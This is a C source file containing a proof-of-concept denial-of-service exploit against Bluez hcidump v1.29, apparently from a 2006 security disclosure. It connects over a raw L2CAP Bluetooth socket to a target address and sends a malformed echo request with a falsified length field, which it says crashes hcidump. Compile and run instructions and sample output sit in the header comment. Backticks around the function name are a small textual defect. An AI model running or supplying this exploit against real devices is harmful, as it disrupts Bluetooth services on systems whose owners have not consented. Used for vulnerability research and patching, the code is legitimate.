/*	Bluez hcidump v1.29 DoS - PoC code			*/
/* 	Pierre BETOUIN <pierre.betouin@security-labs.org>	*/
/*	01/18/06						*/
/*	Crashes hcidump sending bad L2CAP packet		*/
/*								*/
/*	gcc -lbluetooth hcidump-crash.c -o hcidump-crash	*/
/*	./hcidump-crash 00:80:37:XX:XX:XX			*/
/*	L2CAP packet sent (15)					*/
/*	Buffer: 08 01 0C 00 41 41 41 41 41 41 41 41 41 41 41	*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/l2cap.h>

#define SIZE		15
#define FAKE_SIZE	12

// Main function that establishes a L2CAP connection and sends a L2CAP packet.
int `main` (int argc, char **argv)
{
    // Declare variables.
    char *buffer;
    l2cap_cmd_hdr *cmd;    
    struct sockaddr_l2 addr;
    int sock, sent, i;

    // Check if arguments are provided.
    if (argc < 2)
    {
        // Print error message and exit.
        fprintf(stderr, "%s <btaddr>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    // Establish a socket for L2CAP connection.
    if ((sock = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) 
    {
        // Print error message and exit.
        perror("socket");
        exit(EXIT_FAILURE);
    }

    // Clear and set up L2CAP address structure.
    memset(&addr, 0, sizeof(addr));
    addr.l2_family = AF_BLUETOOTH;

    // Bind the socket to the L2CAP address.
    if (bind(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0) 
    {
        // Print error message and exit.
        perror("bind");
        exit(EXIT_FAILURE);
    }

    // Convert the provided address to a Bluetooth address.
    str2ba(argv[1], &addr.l2_bdaddr);

    // Connect to the L2CAP address.
    if (connect(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0) 
    {
        // Print error message and exit.
        perror("connect");
        exit(EXIT_FAILURE);
    }

    // Allocate memory for the buffer.
    if(!(buffer = (char *) malloc ((int) SIZE + 1))) 
    {
        // Print error message and exit.
        perror("malloc");
        exit(EXIT_FAILURE);
    }

    // Initialize the buffer with a repeating `A`.
    memset(buffer, 'A', SIZE);

    // Create a L2CAP command header.
    cmd = (l2cap_cmd_hdr *) buffer;
    cmd->code = L2CAP_ECHO_REQ;
    cmd->ident = 1;
    cmd->len = FAKE_SIZE;

    // Send the L2CAP packet.
    if( (sent=send(sock, buffer, SIZE, 0)) >= 0)
    {
        // Print success message.
        printf("L2CAP packet sent (%d)\n", sent);
    }

    // Print the contents of the buffer.
    printf("Buffer:\t");
    for(i=0; i<sent; i++)
        printf("%.2X ", (unsigned char) buffer[i]);
    printf("\n");

    // Free the buffer.
    free(buffer);

    // Close the socket.
    close(sock);

    // Exit successfully.
    return EXIT_SUCCESS;
}
